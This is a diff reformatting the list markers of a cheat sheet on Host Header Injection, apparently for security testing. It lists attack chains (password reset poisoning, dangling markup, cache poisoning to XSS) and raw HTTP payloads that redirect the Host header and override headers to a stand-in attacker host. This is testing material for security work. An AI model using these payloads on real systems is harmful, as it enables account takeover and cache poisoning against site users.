@@ -23,9 +23,9 @@
 
 ## 3. Host Header Injection
 ### Chain Bugs:
-- HHI ----> Password Reset Poisoning
-- HHI ----> Password Reset Poisoning via dangling markup (Host: target.com:'<a href="//bing.com/?)
-- HHI ----> Web cache poisoning
+a. HHI ----> Password Reset Poisoning
+b. HHI ----> Password Reset Poisoning via dangling markup (Host: target.com:'<a href="//bing.com/?)
+c. HHI ----> Web cache poisoning
     ```
     I. Web Cache Poisoning ----> XSS
     II. Web Cache Poisoning ----> Open Redirection
@@ -33,19 +33,19 @@
     ```
 
 ### Payloads:
-- Change the host header
+I. Change the host header
     ```
     Host: vulnerable-website.com ----> evil-website.com
     ```
     
-- Duplicating the host header
+II. Duplicating the host header
     ```
     GET /index.php HTTP/1.1
     Host: vulnerable-website.com 
     Host: evil-website.com
     ```
     
-- Add host override headers
+III. Add host override headers
     ```
     X-Forwarded-For: evil-website.com 
     X-Forwarded-Host: evil-website.com 
@@ -55,14 +55,14 @@
     X-Host: evil-website.com
     ```
 
-- Add line wrapping
+IV. Add line wrapping
     ```
     GET /index.php HTTP/1.1 
     Host: vulnerable-website.com
     Host: evil-website.com
     ```
 
-- Supply an absolute URL
+V. Supply an absolute URL
     ```
     GET https://vulnerable-website.com/ HTTP/1.1 
     Host: evil-website.com
